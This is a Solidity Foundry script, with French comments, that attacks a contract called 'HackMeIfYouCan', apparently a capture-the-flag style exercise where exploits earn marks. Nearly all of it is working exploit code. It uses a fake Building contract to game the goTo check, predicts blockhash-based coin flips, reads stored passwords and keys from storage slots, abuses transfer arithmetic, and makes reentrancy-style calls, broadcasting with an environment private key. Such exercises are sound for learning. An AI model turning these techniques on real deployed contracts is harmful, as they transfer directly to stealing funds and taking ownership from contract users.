// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/HackMeIfYouCan.sol";
import "../src/ReentranceAttack.sol";

contract FakeBuilding is Building {
    HackMeIfYouCan public hackMeContract;
    bool public toggle = true;
    address public attacker;

    constructor(address _hackMeContract , address _attacker) public {
        hackMeContract = HackMeIfYouCan(payable(_hackMeContract));
        attacker = _attacker;
    }

    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function exploitGoTo(uint256 floor) public {
        hackMeContract.goTo(floor);
    }
}

contract Attack is Script {
    HackMeIfYouCan public hackMeContract;
    FakeBuilding public fakeBuilding;
    address payable attacker;
    bool public inReentrancy;

    function setUp() public {
        attacker = payable(vm.envAddress("PUBLIC_KEY"));
        vm.deal(attacker, 100 ether);
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Starting Attack...");

        bytes32 password = 0x70617373776f7264000000000000000000000000000000000000000000000000; // Exemple de mot de passe
        bytes32[15] memory data;
        hackMeContract = HackMeIfYouCan(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        fakeBuilding = new FakeBuilding(address(hackMeContract), attacker);
        console.log("HackMeIfYouCan contract deployed at:", address(hackMeContract));

        // Contribute to the contract to become the owner when unlocked
        // contribute();
        // get_contribution();

        // console.log("\n=========\n");
        // attackFlip(5);

        // console.log("\n=========\n");
        // attack_contribute();

        // console.log("\n=========\n");
        // console.log(hackMeContract.unlocked());
        // exploit_goTo();

        // console.log("\n==========\n");
        // exploit_sendKey();

        // console.log("\n==========\n");
        // exploit_password();

        // console.log("\n==========\n");
        // exploit_transfer();

        hackMeContract.addPoint();

        // Lock the contract
        // console.log("\n==========\n");
        // lock_contract();

        // Exploit the receive function
        console.log("\n==========\n");
        exploit_receive();

        console.log("Get marks:", hackMeContract.getMarks(attacker));

        vm.stopBroadcast();
    }

    function lock_contract() public {
        if (hackMeContract.unlocked()) {
            console.log("Contract is unlocked");
        } else {
            console.log("Contract is locked");
        }

        console.log("Executing lock_contract attack...");
        hackMeContract.lock();

        if (hackMeContract.unlocked()) {
            console.log("Contract is still unlocked");
        } else {
            console.log("Contract is now locked");
        }
    }

    function contribute() public payable {
        console.log("Owner:", hackMeContract.owner());
        hackMeContract.contribute{value: 0.0009 ether}();
        console.log("Contribution sent");
        console.log("New Owner:", hackMeContract.owner());
    }

    function get_contribution() public view {
        console.log("Contribution:", hackMeContract.getContribution());
    }

    // Attack the flip function to get consecutive wins
    // La faille est dans la fonction flip de HackMeIfYouCan.sol, qui ne vérifie pas si le dernier hash est égal à 0
    // On peut donc appeler la fonction flip avec un guess aléatoire, et la fonction flip mettra à jour les victoires consécutives
    function attackFlip(uint256 iterations) public {
        uint256 FACTOR = 6275657625726723324896521676682367236752985978263786257989175917;
        for (uint256 i = 0; i < iterations; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool guess = coinFlip == 1 ? true : false;
            console.log("Guess: ", guess);

            vm.roll(block.number + 1);

            try hackMeContract.flip(guess) {
                console.log("Flip attempt", i, "succeeded");
            } catch {
                console.log("Flip attempt", i, "failed");
            }

            get_consecutive_wins();
        }
    }

    function get_consecutive_wins() public view {
        console.log("Consecutive Wins:", hackMeContract.getConsecutiveWins(attacker));
    }

    // Attack the contribute function to become the owner
    // La faille est dans la fonction contribute de HackMeIfYouCan.sol, qui ne vérifie pas si le montant de la contribution est supérieur à 0.001 ether
    // On peut donc appeler la fonction contribute avec un montant inférieur à 0.001 ether, et la fonction contribute mettra à jour le propriétaire
    function attack_contribute() public {
        console.log("Starting reentrancy attack on contribute");
        inReentrancy = true;
        hackMeContract.contribute{value: 0.0001 ether}();
        inReentrancy = false;
        console.log("First contribution sent");

        console.log("Attacked contribute");
        console.log("Contribution:", hackMeContract.getContribution());
    }

    // Exploit the goTo function to change the user floor
    // La faille est dans la fonction goTo de HackMeIfYouCan.sol, qui ne vérifie pas si le dernier étage a été atteint
    // On peut donc appeler la fonction goTo avec un étage supérieur à 5, et la fonction isLastFloor renverra true
    function exploit_goTo() public  {
        console.log("Exploiting goTo function");
        fakeBuilding.isLastFloor(1);
        fakeBuilding.exploitGoTo(1);
        console.log("User floor:", hackMeContract.userFloor(attacker));
        console.log("Top status:", hackMeContract.top(attacker));

        fakeBuilding.exploitGoTo(6);
        console.log("User floor:", hackMeContract.userFloor(attacker));
        console.log("Top status:", hackMeContract.top(attacker));
    }

    // Exploit the sendKey function to change the user marks
    // La faille est dans la fonction sendKey de HackMeIfYouCan.sol, qui ne vérifie pas si l'utilisateur a déjà envoyé sa clé
    // On lit la clé de l'utilisateur dans le slot 12, et on l'envoie à la fonction sendKey, la vérification du contrat est contournée
    function exploit_sendKey() public {
        console.log("Exploiting sendKey function");

        bytes32 slot12 = vm.load(address(hackMeContract), bytes32(uint256(16)));

        console.log("Marks before sendKey:", hackMeContract.getMarks(attacker));
        hackMeContract.sendKey(bytes16(slot12));
        console.log("Marks after sendKey:", hackMeContract.getMarks(attacker));
    }

    // Exploit the password function to change the user marks
    // La faille est dans la fonction sendPassword de HackMeIfYouCan.sol, 
    // On lit le mot de passe de l'utilisateur dans le slot 3, et on l'envoie à la fonction sendPassword, la vérification du contrat est contournée
    function exploit_password() public {
        console.log("Exploiting password function");

        bytes32 slot1 = vm.load(address(hackMeContract), bytes32(uint256(3)));

        console.log("Marks before sendPassword:", hackMeContract.getMarks(attacker));
        hackMeContract.sendPassword(slot1);
        console.log("Marks after sendPassword:", hackMeContract.getMarks(attacker));
    }

    // Exploit the transfer function to change the user markss
    // La faille est dans la fonction transfer de HackMeIfYouCan.sol, qui ne vérifie pas si l'utilisateur a plus de 1000000 marks
    // On peut donc appeler la fonction transfer avec un montant supérieur à 1000000, et la fonction transfer updatera mes points
    function exploit_transfer() public {
        console.log("Exploiting transfer function");

        // Appeler la fonction de transfert
        console.log("Marks before transfer:", hackMeContract.getMarks(attacker));

        vm.deal(address(attacker), 1000000);
        hackMeContract.transfer(address(this), 10000); 

        hackMeContract.transfer(attacker, 1);

        console.log("Marks after transfer:", hackMeContract.getMarks(attacker));
    }

    function exploit_receive() public payable {
        console.log("Exploiting receive function");

        inReentrancy = true;
        address(hackMeContract).call{value: 0.001 ether}("");
        inReentrancy = false;

        console.log("Marks after receive:", hackMeContract.getMarks(attacker));
    }



}
